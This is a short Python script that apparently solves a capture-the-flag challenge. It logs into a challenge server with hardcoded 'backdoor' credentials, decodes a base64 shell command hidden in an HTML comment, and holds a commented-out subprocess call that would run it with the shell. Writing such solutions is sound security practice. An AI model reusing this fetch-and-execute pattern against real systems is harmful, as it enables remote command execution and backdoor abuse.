import requests
import base64
import subprocess

# Replace with the dynamic port from the challenge
PORT = 30681
url = f"http://challenge.ctf.games:{PORT}"
auth_header = "Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0"

# Send a request to the server
response = requests.get(url, headers={"Authorization": auth_header})

if response.status_code == 200:
    html_content = response.text
    # Extract content between HTML comment tags
    start = html_content.find("<!--")
    end = html_content.find("-->")
    if start != -1 and end != -1:
        encoded_value = html_content[start + 4:end].strip()
        # Decode from base64
        try:
            decoded_command = base64.b64decode(encoded_value).decode("utf-8")
            print(f"Decoded command: {decoded_command}")
            # Execute the decoded command
            #subprocess.run(decoded_command, shell=True)
        except Exception as e:
            print(f"Failed to decode or execute the command: {e}")
    else:
        print("No HTML comment found in the response.")
else:
    print(f"Failed to retrieve content. Status code: {response.status_code}")
